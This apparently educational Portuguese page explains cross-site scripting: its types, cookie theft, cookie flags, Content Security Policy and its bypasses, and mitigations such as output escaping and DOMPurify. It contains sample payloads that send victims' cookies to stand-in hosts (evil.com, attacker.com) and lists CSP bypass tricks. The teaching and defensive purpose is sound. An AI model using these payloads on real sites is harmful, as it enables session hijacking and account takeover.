XSS — Cross-Site Scripting

O que é XSS?

XSS — Cross-Site Scripting

Injeção de JavaScript malicioso em páginas web — roubo de sessões, keylogging e redirecionamento.

Cross-Site Scripting é a injeção de código JavaScript malicioso em páginas web que outros usuários visualizam. Permite roubo de cookies/sessões, keylogging, redirecionamento, defacement e ataques de phishing internos. É a vulnerabilidade mais prevalente em aplicações web há décadas.

Tipos de XSS

Reflected XSS

O payload é incluído na requisição e refletido imediatamente na resposta. Não é persistido. Requer engenharia social para fazer a vítima clicar em link malicioso.

# URL maliciosa (exemplo):
https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

# Resposta da aplicação vulnerável:
Resultados para: <script>...</script>

Stored XSS (Persistent)

O payload é armazenado no banco de dados e renderizado a cada visita de qualquer usuário. Mais perigoso — não requer interação específica além de visitar a página.

# Comentário de blog enviado pelo atacante:
<img src=x onerror="fetch('https://evil.com/?c='+btoa(document.cookie))">

# Todo usuário que ver o comentário executa o código

DOM-Based XSS

O JavaScript da própria página lê dados de fontes inseguras (URL hash, localStorage) e os escreve no DOM sem sanitização. O payload nunca passa pelo servidor.

// Código vulnerável:
document.getElementById('output').innerHTML =
  location.hash.slice(1); // lê #payload da URL

// URL de ataque:
https://site.com/page#<img src=x onerror=alert(1)>

Self-XSS

Engana o usuário para executar código no próprio console. Não é diretamente explorável por atacante, mas usado em campanhas de social engineering ("console challenge").

Roubo de Sessão e Cookie Stealing

O objetivo final do XSS geralmente é roubar o document.cookie da vítima para sequestro de sessão. Isso é evitado pela flag HttpOnly.

// Payload de cookie stealing (sem HttpOnly):
<script>
  new Image().src = "https://attacker.com/log?c=" + encodeURIComponent(document.cookie);
</script>

// Com HttpOnly ativado: document.cookie = "" — cookies inacessíveis ao JS
// Nesse caso atacante pode usar XSS para:
// - Adicionar admin ao perfil via requisição autenticada (CSRF via XSS)
// - Capturar formulários com keylogger
// - Mudar senha/email da conta
Flag do CookieProteção
HttpOnlyBloqueia acesso via document.cookie — essencial para sessões
SecureCookie só enviado via HTTPS — protege interceptação
SameSite=StrictBloqueia envio em requisições cross-site — mitiga CSRF

Content Security Policy (CSP)

CSP é o mecanismo mais eficaz para mitigar XSS — restringe quais scripts o browser executa.

# Header de resposta HTTP:
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.exemplo.com; object-src 'none'

# Explicação das diretivas:
# default-src 'self'        → por padrão, só carregar recursos do mesmo domínio
# script-src 'self' cdn...  → scripts permitidos: próprio domínio + CDN específico
# object-src 'none'         → bloqueia <object>, <embed> (Flash, plugins)

# EVITE:
Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval'
# 'unsafe-inline' anula proteção contra XSS inline
# 'unsafe-eval' permite eval(), Function(), setTimeout(string)

Bypasses de CSP comuns

  • JSONP endpoint no whitelist: ?callback=alert(1)
  • Angular/Vue em CDN whitelistado: template injection via diretivas
  • Redirecionamentos open: carrega script externo via redirect confiável
  • script-src 'strict-dynamic' mal configurado

CSP Report-Only

Use Content-Security-Policy-Report-Only para testar sem bloquear, com report-uri para coletar violações antes de ativar em modo enforce.

Mitigações Eficazes

1. Sanitização de Output

Todo valor que vem do usuário e é inserido no HTML deve ser escapado. Use bibliotecas como DOMPurify (JS), OWASP Java HTML Sanitizer, AntiXSS (C#).

2. Evitar innerHTML / eval

Prefira textContent sobre innerHTML. Nunca use eval(), setTimeout(string) ou document.write() com dados externos.

3. Content Security Policy

Implemente CSP restritivo, evitando unsafe-inline. Use nonces ou hashes para scripts legítimos.

4. HttpOnly + Secure nos cookies

Todo cookie de sessão deve ter HttpOnly, Secure e SameSite. Limita enormemente o impacto de um XSS bem-sucedido.

XSS continua sendo a vulnerabilidade mais encontrada em bug bounty. Mesmo com frameworks modernos que fazem escaping por padrão (React, Angular, Vue), é possível introduzir XSS via dangerouslySetInnerHTML, innerHTML, v-html ou bypassSecurityTrustHtml. Revise sempre os pontos onde o app serializa dados para o DOM.

"Nunca confie em input do usuário — e nunca coloque input do usuário no DOM sem sanitização."
